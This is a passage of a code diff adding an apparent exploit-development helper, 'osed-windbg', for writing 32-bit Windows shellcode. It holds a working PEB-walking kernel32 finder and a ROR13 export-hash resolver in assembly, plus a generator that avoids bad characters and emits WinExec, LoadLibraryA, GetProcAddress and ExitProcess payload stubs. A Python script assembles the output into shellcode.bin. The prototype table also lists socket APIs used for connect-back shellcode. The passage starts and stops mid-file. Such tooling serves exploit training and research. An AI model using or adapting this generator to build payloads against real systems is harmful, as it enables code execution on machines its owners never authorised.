+      return "";
+    }
+    return value.trim().toLowerCase();
+  }
+  function formatError(error2) {
+    if (error2 instanceof Error && error2.message) {
+      return error2.message;
+    }
+    return String(error2);
+  }
+  function parseHashValue(value) {
+    if (typeof value === "number") {
+      return Number.isFinite(value) ? value >>> 0 : void 0;
+    }
+    if (typeof value === "bigint") {
+      return Number(value & BigInt(4294967295));
+    }
+    const text = value.trim().toLowerCase();
+    if (!text) {
+      return void 0;
+    }
+    const parsed = text.startsWith("0x") ? parseInt(text, 16) : parseInt(text, 10);
+    if (Number.isNaN(parsed)) {
+      return void 0;
+    }
+    return parsed >>> 0;
+  }
+  function moduleBasename(value) {
+    const normalized = value.trim();
+    if (!normalized) {
+      return "<unknown>";
+    }
+    const parts = normalized.split(/[\\/]+/);
+    return parts[parts.length - 1] || normalized;
+  }
+  function moduleNameMatches(name, requested) {
+    const normalize = (value) => value.trim().toLowerCase().replace(/\.dll$/, "");
+    return normalize(name) === normalize(requested);
+  }
+  function parseApiSpec(value) {
+    const trimmed = value.trim();
+    if (!trimmed) return void 0;
+    const parts = trimmed.split("!");
+    if (parts.length === 1) return { symbol: parts[0].trim() || "" };
+    if (parts.length === 2 && parts[0].trim() && parts[1].trim()) {
+      return { module: parts[0].trim(), symbol: parts[1].trim() };
+    }
+    return void 0;
+  }
+  function createShellcodeNamespace() {
+    const helper = new ShellcodeHelper();
+    const helperHelp = (name) => {
+      const entry = findHelpEntry(name);
+      return renderAndReturn(`Help: ${name}`, entry ? helpRows(entry) : [{ Error: `Unknown helper '${name}'.` }]);
+    };
+    const wantsHelp = (value) => value === "help";
+    const renderAndReturn = (title, rows) => {
+      if (rows.length === 0) {
+        return toDxResult(title, rows);
+      }
+      section(title);
+      if (rows.length > 0 && "Error" in rows[0]) {
+        error(rows[0].Error);
+        return toDxResult(title, rows);
+      }
+      const maxPrintedRows = title === "sc.exports" || title === "sc.hashes" ? 100 : 200;
+      const printedRows = rows.length > maxPrintedRows ? rows.slice(0, maxPrintedRows) : rows;
+      const keys = title === "sc.modules" ? ["Base", "End", "Size", "Name"] : [...new Set(printedRows.flatMap((row) => Object.keys(row)))];
+      table(keys.map((key2) => ({ key: key2, header: key2 })), printedRows);
+      if (printedRows.length < rows.length) {
+        info(`Showing first ${printedRows.length} of ${rows.length} rows. Use a filter argument to narrow output; full rows remain available under .rows.`);
+      }
+      return toDxResult(title, rows);
+    };
+    return {
+      peb: (help) => wantsHelp(help) ? helperHelp("sc.peb") : renderAndReturn("sc.peb", helper.peb()),
+      modules: (help) => wantsHelp(help) ? helperHelp("sc.modules") : renderAndReturn("sc.modules", helper.modules()),
+      module_pages: (name) => wantsHelp(name) ? helperHelp("sc.module_pages") : renderAndReturn("sc.module_pages", helper.modulePages(name)),
+      page_summary: (name) => wantsHelp(name) ? helperHelp("sc.page_summary") : renderAndReturn("sc.page_summary", helper.pageSummary(name)),
+      base: (name) => wantsHelp(name) ? helperHelp("sc.base") : renderAndReturn("sc.base", helper.base(name)),
+      pe: (name) => wantsHelp(name) ? helperHelp("sc.pe") : renderAndReturn("sc.pe", helper.pe(name)),
+      exports: (name, filter) => wantsHelp(name) ? helperHelp("sc.exports") : renderAndReturn("sc.exports", helper.exports(name, filter)),
+      resolve: (module, symbol) => wantsHelp(module) ? helperHelp("sc.resolve") : renderAndReturn("sc.resolve", helper.resolve(module, symbol)),
+      hashes: (module, algorithm) => wantsHelp(module) ? helperHelp("sc.hashes") : renderAndReturn("sc.hashes", helper.hashes(module, algorithm)),
+      hash: (name, algorithm) => wantsHelp(name) ? helperHelp("sc.hash") : renderAndReturn("sc.hash", helper.hash(name, algorithm)),
+      hashresolve: (module, hashValue, algorithm) => wantsHelp(module) ? helperHelp("sc.hashresolve") : renderAndReturn("sc.hashresolve", helper.hashresolve(module, hashValue, algorithm)),
+      algorithms: (help) => wantsHelp(help) ? helperHelp("sc.algorithms") : renderAndReturn("sc.algorithms", helper.algorithms()),
+      exportdir: (module) => wantsHelp(module) ? helperHelp("sc.exportdir") : renderAndReturn("sc.exportdir", helper.exportdir(module)),
+      export: (module, symbol) => wantsHelp(module) ? helperHelp("sc.export") : renderAndReturn("sc.export", helper.export(module, symbol)),
+      exportat: (module, ordinalIndex) => wantsHelp(module) ? helperHelp("sc.exportat") : renderAndReturn("sc.exportat", helper.exportat(module, ordinalIndex)),
+      exportwalk: (module, symbol, verbose) => wantsHelp(module) ? helperHelp("sc.exportwalk") : renderAndReturn("sc.exportwalk", helper.exportwalk(module, symbol, verbose)),
+      iat: (module, filter) => wantsHelp(module) ? helperHelp("sc.iat") : renderAndReturn("sc.iat", helper.iat(module, filter)),
+      iat_find: (symbol) => wantsHelp(symbol) ? helperHelp("sc.iat_find") : renderAndReturn("sc.iat_find", helper.iat_find(symbol)),
+      iat_ptr: (module, symbol) => wantsHelp(module) ? helperHelp("sc.iat_ptr") : renderAndReturn("sc.iat_ptr", helper.iat_ptr(module, symbol)),
+      api_plan: (target, badchars = []) => helper.apiPlan(target, badchars)
+    };
+  }
+
+  // src/shellcode/writer.ts
+  var REGS2 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  var SCRATCH = ["eax", "ecx", "edx"];
+  var regIndex = (reg) => REGS2.indexOf(reg);
+  var isReg = (value) => REGS2.includes(value);
+  var hex4 = (value) => `0x${(value >>> 0).toString(16)}`;
+  var hex325 = (value) => `0x${(value >>> 0).toString(16).padStart(8, "0")}`;
+  var fitsImm8 = (value) => (value | 0) >= -128 && (value | 0) <= 127;
+  function le32(value) {
+    const v = value >>> 0;
+    return [v & 255, v >>> 8 & 255, v >>> 16 & 255, v >>> 24 & 255];
+  }
+  function frameOperand(disp) {
+    return `dword ptr [ebp${disp < 0 ? "-" : "+"}0x${Math.abs(disp).toString(16).padStart(2, "0")}]`;
+  }
+  var ALU_EXT = { add: 0, sub: 5, xor: 6 };
+  var x86 = {
+    pushImm: (value) => ({
+      asm: `push ${hex4(value)}`,
+      bytes: fitsImm8(value) ? [106, value & 255] : [104, ...le32(value)]
+    }),
+    pushReg: (reg) => ({ asm: `push ${reg}`, bytes: [80 + regIndex(reg)] }),
+    popReg: (reg) => ({ asm: `pop ${reg}`, bytes: [88 + regIndex(reg)] }),
+    movImm: (reg, value) => ({ asm: `mov ${reg}, ${hex4(value)}`, bytes: [184 + regIndex(reg), ...le32(value)] }),
+    movReg: (dst, src) => ({ asm: `mov ${dst}, ${src}`, bytes: [137, 192 | regIndex(src) << 3 | regIndex(dst)] }),
+    zero: (op5, reg) => ({
+      asm: `${op5} ${reg}, ${reg}`,
+      bytes: [op5 === "xor" ? 49 : 41, 192 | regIndex(reg) << 3 | regIndex(reg)]
+    }),
+    not: (reg) => ({ asm: `not ${reg}`, bytes: [247, 208 + regIndex(reg)] }),
+    neg: (reg) => ({ asm: `neg ${reg}`, bytes: [247, 216 + regIndex(reg)] }),
+    alu: (op5, reg, value) => {
+      const ext = ALU_EXT[op5] << 3;
+      const bytes = fitsImm8(value) ? [131, 192 | ext | regIndex(reg), value & 255] : reg === "eax" ? [5 | ext, ...le32(value)] : [129, 192 | ext | regIndex(reg), ...le32(value)];
+      return { asm: `${op5} ${reg}, ${hex4(value)}`, bytes };
+    },
+    pushFrame: (disp) => ({ asm: `push ${frameOperand(disp)}`, bytes: [255, 117, disp & 255] }),
+    callFrame: (disp) => ({ asm: `call ${frameOperand(disp)}`, bytes: [255, 85, disp & 255] }),
+    storeFrame: (disp, reg) => ({ asm: `mov ${frameOperand(disp)}, ${reg}`, bytes: [137, 69 | regIndex(reg) << 3, disp & 255] }),
+    callReg: (reg) => ({ asm: `call ${reg}`, bytes: [255, 208 + regIndex(reg)] })
+  };
+  var SLOT = { resolver: -4, kernel32: -8, module: -12, proc: -16 };
+  function isClean(lines, bad) {
+    return lines.every((line) => line.bytes !== void 0 && line.bytes.every((byte) => !bad.has(byte)));
+  }
+  var withNote = (lines, note) => lines.map((line, i) => i === lines.length - 1 ? __spreadProps(__spreadValues({}, line), { note }) : line);
+  function xorKey(value, bad) {
+    let key2 = 0;
+    for (let shift = 0; shift < 32; shift += 8) {
+      const byte = value >>> shift & 255;
+      let k = 1;
+      while (k <= 255 && (bad.has(k) || bad.has(byte ^ k))) k += 1;
+      if (k > 255) return void 0;
+      key2 |= k << shift;
+    }
+    return key2 >>> 0;
+  }
+  function registerPlans(value, reg, bad) {
+    const plans = [
+      [x86.movImm(reg, ~value), x86.not(reg), x86.pushReg(reg)],
+      [x86.movImm(reg, -value), x86.neg(reg), x86.pushReg(reg)]
+    ];
+    const key2 = xorKey(value, bad);
+    if (key2 !== void 0) plans.push([x86.movImm(reg, value ^ key2), x86.alu("xor", reg, key2), x86.pushReg(reg)]);
+    for (let k = 1; k <= 255; k += 1) {
+      const addend = k * 16843009 >>> 0;
+      plans.push([x86.movImm(reg, value - addend), x86.alu("add", reg, addend), x86.pushReg(reg)]);
+    }
+    return plans;
+  }
+  function pushValue(value, bad, scratch = SCRATCH) {
+    const v = value >>> 0;
+    if (v === 0) {
+      return scratch.flatMap((reg) => [[x86.zero("xor", reg), x86.pushReg(reg)], [x86.zero("sub", reg), x86.pushReg(reg)]]).find((plan) => isClean(plan, bad));
+    }
+    const direct = [x86.pushImm(v)];
+    if (isClean(direct, bad)) return direct;
+    for (const reg of scratch) {
+      const plan = registerPlans(v, reg, bad).find((candidate) => isClean(candidate, bad));
+      if (plan) return plan;
+    }
+    return void 0;
+  }
+  function describeBytes(bytes) {
+    return `"${bytes.map((byte) => byte === 0 ? "\\0" : byte >= 32 && byte <= 126 ? String.fromCharCode(byte) : `\\x${byte.toString(16).padStart(2, "0")}`).join("")}"`;
+  }
+  function pushString(text, bad, register2) {
+    if (text.length === 0) return { ok: false, error: "Text is empty." };
+    const codes = [...text].map((char) => char.charCodeAt(0));
+    if (codes.some((code) => code < 1 || code > 255)) return { ok: false, error: "Text must be single-byte characters without NUL." };
+    if (register2 === "esp") return { ok: false, error: "ESP already points at the string; pick another register." };
+    const padded = [...codes, 0];
+    while (padded.length % 4 !== 0) padded.push(0);
+    const lines = [];
+    for (let offset = padded.length - 4; offset >= 0; offset -= 4) {
+      const chunk = padded.slice(offset, offset + 4);
+      const value = (chunk[0] | chunk[1] << 8 | chunk[2] << 16 | chunk[3] << 24) >>> 0;
+      const plan = pushValue(value, bad);
+      if (!plan) return { ok: false, error: `No encoding of dword ${hex325(value)} (${describeBytes(chunk)}) avoids the bad characters.` };
+      lines.push(...withNote(plan, describeBytes(chunk)));
+    }
+    if (register2) {
+      const pointer = [[x86.movReg(register2, "esp")], [x86.pushReg("esp"), x86.popReg(register2)]].find((plan) => isClean(plan, bad));
+      if (!pointer) return { ok: false, error: `No way to copy ESP into ${register2} avoids the bad characters.` };
+      lines.push(...withNote(pointer, `${register2} -> ${describeBytes(codes)}`));
+    }
+    return { ok: true, lines };
+  }
+  var API_PROTOTYPES = [
+    { name: "WinExec", module: "kernel32.dll", params: ["lpCmdLine", "uCmdShow"] },
+    { name: "ExitProcess", module: "kernel32.dll", params: ["uExitCode"] },
+    { name: "TerminateProcess", module: "kernel32.dll", params: ["hProcess", "uExitCode"] },
+    { name: "ExitThread", module: "kernel32.dll", params: ["dwExitCode"] },
+    { name: "LoadLibraryA", module: "kernel32.dll", params: ["lpLibFileName"] },
+    { name: "GetProcAddress", module: "kernel32.dll", params: ["hModule", "lpProcName"] },
+    { name: "VirtualAlloc", module: "kernel32.dll", params: ["lpAddress", "dwSize", "flAllocationType", "flProtect"] },
+    { name: "VirtualProtect", module: "kernel32.dll", params: ["lpAddress", "dwSize", "flNewProtect", "lpflOldProtect"] },
+    { name: "CreateProcessA", module: "kernel32.dll", params: ["lpApplicationName", "lpCommandLine", "lpProcessAttributes", "lpThreadAttributes", "bInheritHandles", "dwCreationFlags", "lpEnvironment", "lpCurrentDirectory", "lpStartupInfo", "lpProcessInformation"] },
+    { name: "WaitForSingleObject", module: "kernel32.dll", params: ["hHandle", "dwMilliseconds"] },
+    { name: "WSAStartup", module: "ws2_32.dll", params: ["wVersionRequested", "lpWSAData"] },
+    { name: "WSASocketA", module: "ws2_32.dll", params: ["af", "type", "protocol", "lpProtocolInfo", "g", "dwFlags"] },
+    { name: "connect", module: "ws2_32.dll", params: ["s", "name", "namelen"] },
+    { name: "MessageBoxA", module: "user32.dll", params: ["hWnd", "lpText", "lpCaption", "uType"] }
+  ];
+  function parseCallArg(raw) {
+    const text = raw.trim();
+    if (/^-?(0x[0-9a-f]+|\d+)$/i.test(text)) {
+      const negative = text.startsWith("-");
+      const magnitude = Number(negative ? text.slice(1) : text);
+      if (magnitude <= 4294967295) return { kind: "number", value: (negative ? -magnitude : magnitude) >>> 0 };
+    }
+    const lower = text.toLowerCase();
+    if (isReg(lower)) return { kind: "register", reg: lower };
+    const frame = /^(?:dword\s+ptr\s*)?\[\s*ebp\s*([+-])\s*(0x[0-9a-f]+|\d+)\s*\]$/i.exec(text);
+    if (frame) {
+      const disp = (frame[1] === "-" ? -1 : 1) * Number(frame[2]);
+      if (disp >= -128 && disp <= 127) return { kind: "frame", disp };
+    }
+    return { kind: "expr", text };
+  }
+  function mentionedRegisters(arg) {
+    if (arg.kind === "register") return [arg.reg];
+    if (arg.kind === "expr") return REGS2.filter((reg) => new RegExp(`\\b${reg}\\b`, "i").test(arg.text));
+    return arg.kind === "frame" ? ["ebp"] : [];
+  }
+  function callFrame(api, rawArgs, bad) {
+    var _a, _b, _c, _d;
+    const typed = api.trim();
+    if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(typed)) return { ok: false, error: "API name must be an export name such as WinExec." };
+    const prototype = API_PROTOTYPES.find((entry) => entry.name.toLowerCase() === typed.toLowerCase());
+    const name = (_a = prototype == null ? void 0 : prototype.name) != null ? _a : typed;
+    const module = (_b = prototype == null ? void 0 : prototype.module) != null ? _b : "kernel32.dll";
+    const warnings = [];
+    if (!prototype) {
+      warnings.push(`"${typed}" is not in the prototype table: the hash uses the name exactly as typed (exports are case-sensitive), the module is assumed to be kernel32.dll, and arguments are only numbered.`);
+    } else {
+      if (prototype.name !== typed) warnings.push(`Using the export spelling "${prototype.name}"; the hash is case-sensitive.`);
+      if (prototype.params.length !== rawArgs.length) warnings.push(`${prototype.name} takes ${prototype.params.length} argument(s); ${rawArgs.length} given.`);
+    }
+    const args = rawArgs.map(parseCallArg);
+    const scratch = SCRATCH.filter((reg) => !args.some((arg) => mentionedRegisters(arg).includes(reg)));
+    const lines = [];
+    for (let i = args.length - 1; i >= 0; i -= 1) {
+      const arg = args[i];
+      const label = `arg${i + 1} ${(_c = prototype == null ? void 0 : prototype.params[i]) != null ? _c : "?"} = ${rawArgs[i].trim()}`;
+      if (arg.kind === "number") {
+        const plan = pushValue(arg.value, bad, scratch);
+        if (!plan) return { ok: false, error: `No encoding of ${label} avoids the bad characters.` };
+        lines.push(...withNote(plan, label));
+      } else if (arg.kind === "register") {
+        lines.push(__spreadProps(__spreadValues({}, x86.pushReg(arg.reg)), { note: label }));
+      } else if (arg.kind === "frame") {
+        lines.push(__spreadProps(__spreadValues({}, x86.pushFrame(arg.disp)), { note: label }));
+      } else {
+        const operand = arg.text.includes("[") && !/\bptr\b/i.test(arg.text) ? `dword ptr ${arg.text}` : arg.text;
+        lines.push({ asm: `push ${operand}`, note: `${label}${arg.text.includes("<") ? " (placeholder)" : ""}` });
+      }
+    }
+    const hash = ror13Hash(name);
+    const hashPlan = pushValue(hash, bad, scratch);
+    if (!hashPlan) return { ok: false, error: `No encoding of hash ${hex325(hash)} avoids the bad characters.` };
+    lines.push(...withNote(hashPlan, `ROR13("${name}") = ${hex325(hash)}`));
+    const kernel32 = module === "kernel32.dll";
+    lines.push(
+      __spreadProps(__spreadValues({}, x86.pushFrame(kernel32 ? SLOT.kernel32 : SLOT.module)), { note: kernel32 ? "kernel32 base" : `${module} base saved after LoadLibraryA` }),
+      __spreadProps(__spreadValues({}, x86.callFrame(SLOT.resolver)), { note: `resolver: eax = ${name}` }),
+      __spreadProps(__spreadValues({}, x86.callReg("eax")), { note: `${name} pops its ${args.length} argument(s)` })
+    );
+    for (const line of lines) {
+      const hits = ((_d = line.bytes) != null ? _d : []).filter((byte) => bad.has(byte));
+      if (hits.length > 0) warnings.push(`"${line.asm}" holds bad byte(s) ${hexBytes(hits)}; rewrite that line by hand.`);
+    }
+    const params = prototype ? prototype.params.join(", ") : args.map((_, i) => `arg${i + 1}`).join(", ");
+    return { ok: true, api: name, module, hash, known: !!prototype, title: `${name}(${params}) in ${module}, ROR13 ${hex325(hash)}`, lines, warnings };
+  }
+  function parseBadchars(value) {
+    if (value === void 0 || value === null || value === "") return [0];
+    if (Array.isArray(value)) {
+      const bytes2 = value.map(Number);
+      return bytes2.every((byte) => Number.isInteger(byte) && byte >= 0 && byte <= 255) ? [.../* @__PURE__ */ new Set([0, ...bytes2])].sort((a, b) => a - b) : void 0;
+    }
+    const text = String(value).trim();
+    const tokens = text.split(/[\s,]+|(?=\\x)/i).filter(Boolean);
+    const bytes = [];
+    for (const token of tokens) {
+      const pair = /^(?:\\x|0x)?([0-9a-f]{2})$/i.exec(token);
+      if (pair) {
+        bytes.push(parseInt(pair[1], 16));
+        continue;
+      }
+      if (/^[0-9a-f]+$/i.test(token) && token.length % 2 === 0) {
+        for (let i = 0; i < token.length; i += 2) bytes.push(parseInt(token.slice(i, i + 2), 16));
+        continue;
+      }
+      return void 0;
+    }
+    return [.../* @__PURE__ */ new Set([0, ...bytes])].sort((a, b) => a - b);
+  }
+  function hexBytes(bytes) {
+    return bytes.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+  }
+  function renderAsm(lines) {
+    const asmWidth = Math.max(...lines.map((line) => line.asm.length));
+    const byteWidth = Math.max(...lines.map((line) => (line.bytes ? hexBytes(line.bytes) : "??").length));
+    return lines.map((line) => {
+      const bytes = (line.bytes ? hexBytes(line.bytes) : "??").padEnd(byteWidth);
+      return `${line.asm.padEnd(asmWidth)}  ; ${bytes}${line.note ? `  ${line.note}` : ""}`.trimEnd();
+    });
+  }
+  var pyString = (text) => `"${text.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"`;
+  function renderKeystoneCode(lines, name = "CODE") {
+    const width = Math.max(...lines.map((line) => pyString(`${line.asm};`).length));
+    return [
+      `${name} = (`,
+      ...lines.map((line) => `    ${pyString(`${line.asm};`).padEnd(width)}${line.note ? `  # ${line.note}` : ""}`.trimEnd()),
+      ")"
+    ];
+  }
+  var TEMPLATE_TASK_HELP = "winexec=<command line>, loadlibrary=<dll>, getprocaddress=<export>, exit, terminate, show=<uCmdShow for later winexec tasks>, bad=<bad chars>";
+  function parseTemplateArgs(tokens) {
+    const tasks = [];
+    let badchars = [0];
+    let show = 1;
+    for (const raw of tokens) {
+      const token = raw.trim();
+      const eq = token.indexOf("=");
+      const key2 = (eq < 0 ? token : token.slice(0, eq)).trim().toLowerCase();
+      const value = eq < 0 ? "" : token.slice(eq + 1);
+      if (key2 === "bad" || key2 === "badchars") {
+        const parsed = parseBadchars(value);
+        if (!parsed) return { ok: false, error: `Cannot read the bad characters "${value}".` };
+        badchars = parsed;
+      } else if (key2 === "show") {
+        if (!/^\d+$/.test(value.trim())) return { ok: false, error: `show takes a number such as 0 (SW_HIDE) or 1 (SW_SHOWNORMAL), not "${value}".` };
+        show = Number(value.trim());
+      } else if (key2 === "winexec" && value) {
+        tasks.push({ kind: "winexec", command: value, show });
+      } else if (key2 === "loadlibrary" && value) {
+        tasks.push({ kind: "loadlibrary", dll: value.trim() });
+      } else if (key2 === "getprocaddress" && value) {
+        tasks.push({ kind: "getprocaddress", name: value.trim() });
+      } else if (key2 === "exit" || key2 === "exitprocess") {
+        tasks.push({ kind: "exitprocess" });
+      } else if (key2 === "terminate" || key2 === "terminateprocess") {
+        tasks.push({ kind: "terminateprocess" });
+      } else {
+        return { ok: false, error: `Unknown task "${token}". Tasks: ${TEMPLATE_TASK_HELP}.` };
+      }
+    }
+    if (tasks.length === 0) tasks.push({ kind: "winexec", command: "calc.exe", show }, { kind: "exitprocess" });
+    return { ok: true, tasks, badchars };
+  }
+  var op4 = (asm, note) => ({ asm, note });
+  var PROLOGUE = [
+    { comment: "Entry: save the caller's registers, open a frame, and move esp 0x7f0 bytes down." },
+    { comment: "Slots below ebp: -0x04 resolver, -0x08 kernel32 base, -0x0c LoadLibraryA result, -0x10 GetProcAddress result." },
+    op4("pushad"),
+    op4("mov ebp, esp"),
+    op4("add esp, 0xfffff810", "esp = ebp - 0x7f0; a sub of 0x7f0 would hold 00 bytes")
+  ];
+  var FIND_KERNEL32 = [
+    { comment: "kernel32 base: TEB -> PEB -> loader data -> modules in initialization order." },
+    op4("xor ecx, ecx"),
+    op4("mov eax, dword ptr fs:[ecx+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
+    op4("mov eax, dword ptr [eax+0x0c]", "PEB_LDR_DATA"),
+    op4("mov esi, dword ptr [eax+0x1c]", "first InInitializationOrderModuleList link"),
+    { label: "k32_next" },
+    op4("mov ebx, dword ptr [esi+0x08]", "DllBase of this entry"),
+    op4("lea edi, [esi+0x1c]", "edi -> BaseDllName"),
+    op4("mov esi, dword ptr [esi]", "advance now, the checks below use ebx and edi"),
+    op4("cmp word ptr [edi], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
+    op4("jne k32_next"),
+    op4("mov edi, dword ptr [edi+0x04]", "BaseDllName.Buffer"),
+    op4("mov al, byte ptr [edi]"),
+    op4("and al, 0xdf", "upper case"),
+    op4("cmp al, 0x4b", "'K' rules out other 12-char names"),
+    op4("jne k32_next"),
+    op4(`mov ${frameOperand(SLOT.kernel32)}, ebx`, "kernel32 base"),
+    op4(`mov ${frameOperand(SLOT.module)}, ebx`, "module slot starts as kernel32 until a LoadLibraryA task runs")
+  ];
+  var RESOLVER = [
+    { comment: "Store the resolver address: a backward call pushes it without 00 bytes in the rel32." },
+    op4("jmp res_call"),
+    { label: "res_pop" },
+    op4("pop esi", "esi = resolve_hash"),
+    op4(`mov ${frameOperand(SLOT.resolver)}, esi`, "resolver"),
+    op4("jmp main"),
+    { label: "res_call" },
+    op4("call res_pop"),
+    { comment: "resolve_hash(module_base, hash) -> eax = export address, 0 when no name matches." },
+    { comment: "Call it as: push hash; push module_base; call [ebp-0x04]. It pops both arguments and keeps every register but eax." },
+    { label: "resolve_hash" },
+    op4("push ebx"),
+    op4("push ecx"),
+    op4("push edx"),
+    op4("push esi"),
+    op4("push edi"),
+    op4("mov ebx, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
+    op4("mov eax, dword ptr [ebx+0x3c]", "e_lfanew"),
+    op4("mov edi, dword ptr [ebx+eax+0x78]", "export directory RVA"),
+    op4("lea edi, [ebx+edi+0x18]", "edi -> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
+    op4("mov ecx, dword ptr [edi]", "NumberOfNames, walked from the last name down"),
+    { label: "rh_scan" },
+    op4("jecxz rh_none"),
+    op4("dec ecx"),
+    op4("mov esi, dword ptr [edi+0x08]", "AddressOfNames"),
+    op4("add esi, ebx"),
+    op4("mov esi, dword ptr [esi+ecx*4]", "name RVA"),
+    op4("add esi, ebx"),
+    op4("xor edx, edx", "running hash"),
+    op4("xor eax, eax"),
+    { label: "rh_char" },
+    op4("lodsb"),
+    op4("test al, al"),
+    op4("jz rh_hashed"),
+    op4("rol edx, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
+    op4("add edx, eax"),
+    op4("jmp rh_char"),
+    { label: "rh_hashed" },
+    op4("cmp edx, dword ptr [esp+0x1c]", "wanted hash"),
+    op4("jne rh_scan"),
+    op4("mov esi, dword ptr [edi+0x0c]", "AddressOfNameOrdinals"),
+    op4("add esi, ebx"),
+    op4("movzx ecx, word ptr [esi+ecx*2]", "name index -> function index"),
+    op4("mov esi, dword ptr [edi+0x04]", "AddressOfFunctions"),
+    op4("add esi, ebx"),
+    op4("mov eax, dword ptr [esi+ecx*4]", "function RVA"),
+    op4("add eax, ebx", "function VA"),
+    op4("jmp rh_out"),
+    { label: "rh_none" },
+    op4("xor eax, eax"),
+    { label: "rh_out" },
+    op4("mov edx, dword ptr [esp+0x14]", "return address"),
+    op4("mov dword ptr [esp+0x1c], edx", "over the hash slot, so one add drops both arguments"),
+    op4("pop edi"),
+    op4("pop esi"),
+    op4("pop edx"),
+    op4("pop ecx"),
+    op4("pop ebx"),
+    op4("add esp, 0x08", "ret 8 would encode a 00 byte"),
+    op4("ret"),
+    { label: "main" }
+  ];
+  var EPILOGUE = [
+    { comment: "Exit: restore the caller's stack and registers and return to it." },
+    op4("mov esp, ebp"),
+    op4("popad"),
+    op4("ret")
+  ];
+  function taskLines(task, bad, index) {
+    const frame = (api, args, after = []) => {
+      const call = callFrame(api, args, bad);
+      return call.ok ? { ok: true, lines: [...call.lines, ...after] } : call;
+    };
+    const withString = (text, then) => {
+      const pushed = pushString(text, bad, "ebx");
+      if (!pushed.ok) return pushed;
+      return then.ok ? { ok: true, lines: [...pushed.lines, ...then.lines] } : then;
+    };
+    const header = (text, body) => body.ok ? { ok: true, lines: [{ comment: `Task ${index}: ${text}` }, ...body.lines] } : body;
+    switch (task.kind) {
+      case "winexec":
+        return header(
+          `WinExec(${describeBytes([...task.command].map((c) => c.charCodeAt(0)))}, ${task.show})`,
+          withString(task.command, frame("WinExec", ["ebx", String(task.show)]))
+        );
+      case "loadlibrary":
+        return header(
+          `LoadLibraryA("${task.dll}"), base saved at [ebp-0x0c]`,
+          withString(task.dll, frame("LoadLibraryA", ["ebx"], [__spreadProps(__spreadValues({}, x86.storeFrame(SLOT.module, "eax")), { note: `${task.dll} base` })]))
+        );
+      case "getprocaddress":
+        return header(
+          `GetProcAddress(last LoadLibraryA base or kernel32, "${task.name}"), address saved at [ebp-0x10]`,
+          withString(task.name, frame("GetProcAddress", [frameOperand(SLOT.module), "ebx"], [__spreadProps(__spreadValues({}, x86.storeFrame(SLOT.proc, "eax")), { note: `${task.name}: push its arguments, then call dword ptr [ebp-0x10]` })]))
+        );
+      case "exitprocess":
+        return header("ExitProcess(0)", frame("ExitProcess", ["0"]));
+      case "terminateprocess":
+        return header("TerminateProcess(current process, 0)", frame("TerminateProcess", ["-1", "0"]));
+    }
+  }
+  function pythonAsmEntries(lines) {
+    const entries = lines.map((line) => {
+      var _a;
+      return "comment" in line ? { text: "", note: line.comment, comment: true } : "label" in line ? { text: `${pyString(`${line.label}:`)},`, note: "", comment: false } : { text: `${pyString(line.asm)},`, note: (_a = line.note) != null ? _a : "", comment: false };
+    });
+    const width = Math.max(...entries.filter((entry) => !entry.comment).map((entry) => entry.text.length));
+    return entries.map((entry) => entry.comment ? `    # ${entry.note}` : `    ${entry.text.padEnd(width)}${entry.note ? `  # ${entry.note}` : ""}`.trimEnd());
+  }
+  var SCRIPT_TAIL = String.raw`
+LABEL = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*):$")
+LABEL_NAMES = {m.group(1) for m in map(LABEL.match, ASM) if m}
+
+
+def place_lines(ks):
+    """Assemble each instruction alone at its final offset, so every byte maps back to its line."""
+    labels = {}
+    for _ in range(16):
+        placed, seen, offset = [], {}, 0
+        for line in ASM:
+            match = LABEL.match(line)
+            if match:
+                seen[match.group(1)] = offset
+                continue
+            text = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b",
+                          lambda m: hex(labels.get(m.group(0), offset)) if m.group(0) in LABEL_NAMES else m.group(0),
+                          line)
+            try:
+                encoding, _ = ks.asm(text, offset)
+            except Exception as error:
+                sys.exit(f"[-] cannot assemble {line!r}: {error}")
+            encoding = bytes(encoding or b"")
+            placed.append((offset, line, encoding))
+            offset += len(encoding)
+        if seen == labels:
+            return placed
+        labels = seen
+    sys.exit("[-] label offsets did not settle")
+
+
+def main():
+    ks = Ks(KS_ARCH_X86, KS_MODE_32)
+    whole, _ = ks.asm("\n".join(ASM), 0)
+    code = bytes(whole)
+    placed = place_lines(ks)
+    if b"".join(encoding for _, _, encoding in placed) != code:
+        print("[!] the per-line map differs from the whole assembly; treat offsets as approximate")
+    print(f"[+] {len(code)} bytes")
+    bad = [(offset + i, byte, line) for offset, line, encoding in placed
+           for i, byte in enumerate(encoding) if byte in BADCHARS]
+    for offset, byte, line in bad:
+        print(f"[-] bad byte 0x{byte:02x} at offset 0x{offset:04x} in: {line}")
+    print(f"[+] {len(bad)} bad bytes against {' '.join(f'{b:02x}' for b in BADCHARS)}")
+    with open("shellcode.bin", "wb") as handle:
+        handle.write(code)
+    print("[+] wrote shellcode.bin")
+    print('shellcode = b""')
+    for start in range(0, len(code), 16):
+        print('shellcode += b"' + "".join(f"\\x{byte:02x}" for byte in code[start:start + 16]) + '"')
+    return 1 if bad else 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+`;
+  function buildTemplate(plan, invocation) {
+    const bad = new Set(plan.badchars);
+    const body = [];
+    for (const [i, task] of plan.tasks.entries()) {
+      const lines = taskLines(task, bad, i + 1);
+      if (!lines.ok) return lines;
+      body.push(...lines.lines);
+    }
+    const exits = plan.tasks.some((task) => task.kind === "exitprocess" || task.kind === "terminateprocess");
+    const epilogue = exits ? [{ comment: "Not reached after the exit call; it returns to the caller if you delete that task." }, ...EPILOGUE] : EPILOGUE;
+    const asm = [...PROLOGUE, ...FIND_KERNEL32, ...RESOLVER, ...body, ...epilogue];
+    const script = [
+      "#!/usr/bin/env python3",
+      `# build_sc.py from osed-windbg ${invocation}`,
+      "# Needs Python 3 and keystone-engine (pip install keystone-engine).",
+      "# Prints the size and every bad byte with its offset and line, writes shellcode.bin,",
+      "# and prints the bytes as a Python literal. Exit code 1 means a bad byte is present.",
+      "import re",
+      "import sys",
+      "",
